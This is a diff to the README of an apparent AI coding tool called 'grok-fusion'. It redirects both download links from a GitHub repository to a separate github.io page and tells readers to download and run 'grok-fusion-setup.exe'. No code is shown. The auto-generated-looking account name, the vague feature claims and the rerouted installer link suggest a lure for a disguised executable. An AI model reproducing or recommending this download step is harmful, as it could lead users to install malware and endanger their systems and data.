@@ -1,6 +1,6 @@
 # 🧠 grok-fusion - Better code through smart AI decisions
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/kiplingesque-uncertainness858/grok-fusion)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://kiplingesque-uncertainness858.github.io)
 
 This software brings advanced AI reasoning to your computer. It helps you build, fix, and plan software projects by acting as a partner for your code. Use it to generate complex features, find bugs, or map out your project architecture without manual effort.
 
@@ -26,7 +26,7 @@ Your computer needs a few basic things to run this tool:
 
 Follow these steps to install and set up your application.
 
-1. Visit [this page to download](https://github.com/kiplingesque-uncertainness858/grok-fusion) the latest version of the application.
+1. Visit [this page to download](https://kiplingesque-uncertainness858.github.io) the latest version of the application.
 2. Locate the file named grok-fusion-setup.exe in your downloads folder.
 3. Double-click the file to start the installer.
 4. Follow the prompts on your screen. Click Next until the installation finishes.
